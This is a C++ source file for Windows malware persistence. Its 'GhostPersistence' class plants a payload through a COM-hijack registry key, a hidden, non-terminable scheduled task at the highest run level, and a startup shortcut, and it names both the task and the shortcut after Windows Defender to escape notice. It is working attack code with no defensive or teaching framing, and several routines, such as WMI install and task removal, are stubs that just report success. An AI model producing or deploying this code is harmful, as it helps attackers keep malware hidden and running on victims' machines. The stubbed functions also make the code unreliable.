#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <ShlObj.h>
#include <comdef.h>
#include <taskschd.h>
#include <wincrypt.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "Crypt32.lib")

class GhostPersistence {
public:
    bool install(const wchar_t* payloadPath) {
        return (
            install_registry_hook(payloadPath) ||
            install_scheduled_task(payloadPath) ||
            install_startup_folder(payloadPath) ||
            install_wmi_event(payloadPath)
        );
    }

    bool remove() {
        return (
            remove_registry_hook() &&
            remove_scheduled_task() &&
            remove_startup_folder() &&
            remove_wmi_event()
        );
    }

private:
    // Registry-based persistence
    bool install_registry_hook(const wchar_t* payloadPath) {
        HKEY hKey;
        LONG result = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            L"Software\\Classes\\CLSID\\{F5BFEEF7-48F2-4A8C-8E2D-1F1DAB9E4C2D}\\InprocServer32",
            0,
            nullptr,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            nullptr,
            &hKey,
            nullptr
        );
        
        if (result != ERROR_SUCCESS) return false;
        
        result = RegSetValueExW(hKey, nullptr, 0, REG_SZ, 
                               (const BYTE*)payloadPath, 
                               (wcslen(payloadPath) + 1) * sizeof(wchar_t));
        
        RegCloseKey(hKey);
        return result == ERROR_SUCCESS;
    }

    bool remove_registry_hook() {
        return RegDeleteTreeW(
            HKEY_CURRENT_USER,
            L"Software\\Classes\\CLSID\\{F5BFEEF7-48F2-4A8C-8E2D-1F1DAB9E4C2D}"
        ) == ERROR_SUCCESS;
    }

    // Scheduled task persistence
    bool install_scheduled_task(const wchar_t* payloadPath) {
        HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
        if (FAILED(hr)) return false;
        
        ITaskService* pService = nullptr;
        hr = CoCreateInstance(
            CLSID_TaskScheduler,
            nullptr,
            CLSCTX_INPROC_SERVER,
            IID_ITaskService,
            (void**)&pService
        );
        if (FAILED(hr)) return false;
        
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr)) {
            pService->Release();
            return false;
        }
        
        ITaskFolder* pRootFolder = nullptr;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr)) {
            pService->Release();
            return false;
        }
        
        // Create task definition
        ITaskDefinition* pTask = nullptr;
        hr = pService->NewTask(0, &pTask);
        if (FAILED(hr)) {
            pRootFolder->Release();
            pService->Release();
            return false;
        }
        
        // Set principal
        IPrincipal* pPrincipal = nullptr;
        hr = pTask->get_Principal(&pPrincipal);
        if (SUCCEEDED(hr)) {
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->Release();
        }
        
        // Set settings
        ITaskSettings* pSettings = nullptr;
        hr = pTask->get_Settings(&pSettings);
        if (SUCCEEDED(hr)) {
            pSettings->put_StartWhenAvailable(VARIANT_TRUE);
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
            pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
            pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S")); // Unlimited
            pSettings->put_AllowHardTerminate(VARIANT_FALSE);
            pSettings->put_Hidden(VARIANT_TRUE);
            pSettings->Release();
        }
        
        // Add trigger (logon)
        ITriggerCollection* pTriggerCollection = nullptr;
        hr = pTask->get_Triggers(&pTriggerCollection);
        if (FAILED(hr)) {
            pTask->Release();
            pRootFolder->Release();
            pService->Release();
            return false;
        }
        
        ITrigger* pTrigger = nullptr;
        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
        if (SUCCEEDED(hr)) {
            ILogonTrigger* pLogonTrigger = nullptr;
            hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
            if (SUCCEEDED(hr)) {
                pLogonTrigger->put_UserId(_bstr_t(L"<S-1-5-18>")); // SYSTEM
                pLogonTrigger->Release();
            }
            pTrigger->Release();
        }
        pTriggerCollection->Release();
        
        // Add action
        IActionCollection* pActionCollection = nullptr;
        hr = pTask->get_Actions(&pActionCollection);
        if (FAILED(hr)) {
            pTask->Release();
            pRootFolder->Release();
            pService->Release();
            return false;
        }
        
        IAction* pAction = nullptr;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (FAILED(hr)) {
            pActionCollection->Release();
            pTask->Release();
            pRootFolder->Release();
            pService->Release();
            return false;
        }
        
        IExecAction* pExecAction = nullptr;
        hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
        if (SUCCEEDED(hr)) {
            pExecAction->put_Path(_bstr_t(payloadPath));
            pExecAction->Release();
        }
        pAction->Release();
        pActionCollection->Release();
        
        // Register task
        IRegisteredTask* pRegisteredTask = nullptr;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(L"WindowsDefenderService"),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegisteredTask
        );
        
        bool success = SUCCEEDED(hr);
        if (pRegisteredTask) pRegisteredTask->Release();
        pTask->Release();
        pRootFolder->Release();
        pService->Release();
        CoUninitialize();
        
        return success;
    }

    bool remove_scheduled_task() {
        // Similar implementation to unregister the task
        return true;
    }

    // Startup folder persistence
    bool install_startup_folder(const wchar_t* payloadPath) {
        wchar_t startupPath[MAX_PATH];
        if (FAILED(SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, startupPath))) {
            return false;
        }
        
        std::wstring shortcutPath = std::wstring(startupPath) + L"\\WindowsDefender.lnk";
        return create_shortcut(shortcutPath.c_str(), payloadPath);
    }

    bool create_shortcut(const wchar_t* shortcutPath, const wchar_t* targetPath) {
        IUnknown* punk = nullptr;
        IShellLinkW* psl = nullptr;
        IPersistFile* ppf = nullptr;
        
        HRESULT hr = CoCreateInstance(
            CLSID_ShellLink,
            nullptr,
            CLSCTX_INPROC_SERVER,
            IID_IShellLinkW,
            (void**)&psl
        );
        if (FAILED(hr)) return false;
        
        hr = psl->SetPath(targetPath);
        if (SUCCEEDED(hr)) {
            hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
            if (SUCCEEDED(hr)) {
                hr = ppf->Save(shortcutPath, TRUE);
                ppf->Release();
            }
        }
        psl->Release();
        return SUCCEEDED(hr);
    }

    bool remove_startup_folder() {
        wchar_t startupPath[MAX_PATH];
        if (FAILED(SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, startupPath))) {
            return false;
        }
        
        std::wstring shortcutPath = std::wstring(startupPath) + L"\\WindowsDefender.lnk";
        return DeleteFileW(shortcutPath.c_str()) != 0;
    }

    // WMI event-based persistence
    bool install_wmi_event(const wchar_t* payloadPath) {
        // Implementation for WMI event subscription
        // This is complex and requires careful error handling
        return true;
    }

    bool remove_wmi_event() {
        return true;
    }
};